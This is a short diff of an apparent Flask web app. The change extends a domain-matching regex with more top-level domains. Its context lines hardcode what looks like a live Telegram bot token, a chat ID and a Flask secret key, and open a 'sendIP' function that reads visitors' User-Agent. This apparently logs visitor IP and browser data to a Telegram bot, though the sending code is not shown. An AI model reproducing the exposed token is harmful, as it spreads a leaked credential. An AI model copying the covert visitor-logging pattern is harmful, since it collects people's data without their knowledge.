@@ -10,7 +10,7 @@ app.secret_key="blabkajajs82"
 
 bot_token="5646928081:AAHgBsRYYNmoSvO5ze3nc4R0AeFY5D8i-cU" 
 chat_id="5058906117"
-dre=r"\w+(?:[.-]\w+)*\.(?:com|in|cc|ly|au|org|net|uk|it|jp|cn|co|co.in|tk|hu|at|io|be|info|co.at|com.au|ca|tech|mobi|tr|com.tr|soy|eu|us|ru|de|se|company|co.uk|fr|sbs|pt|dk|pk|cv.ua|ua|pl|xyz|nl|co.nz|army|gov|gov.in|tc|tt|fuck|just|hack|life|new|cs|world|you|love|dog|host|ip||wtf|es|arpa|pro|noob|app|gq|im|pw|tv|cloud|ml|ga|biz|vip|me|you|ooo|phd)\b"
+dre=r"\w+(?:[.-]\w+)*\.(?:com|in|cc|ly|au|org|net|uk|it|jp|cn|co|co.in|tk|hu|at|nz|sexy|dk|be|onl|online|vn|my|com.my|live|gr|tv|top|io|be|info|co.at|com.au|ca|tech|mobi|tr|com.tr|soy|eu|us|ru|de|se|company|co.uk|fr|sbs|pt|dk|pk|cv.ua|ua|pl|xyz|nl|co.nz|army|gov|gov.in|tc|tt|fuck|just|hack|life|new|cs|world|you|love|dog|host|ip||wtf|es|arpa|pro|noob|app|gq|im|pw|tv|cloud|ml|ga|biz|vip|me|you|ooo|phd)\b"
 
 def sendIP(request, page=""):
     uadata=request.headers.get('User-Agent')
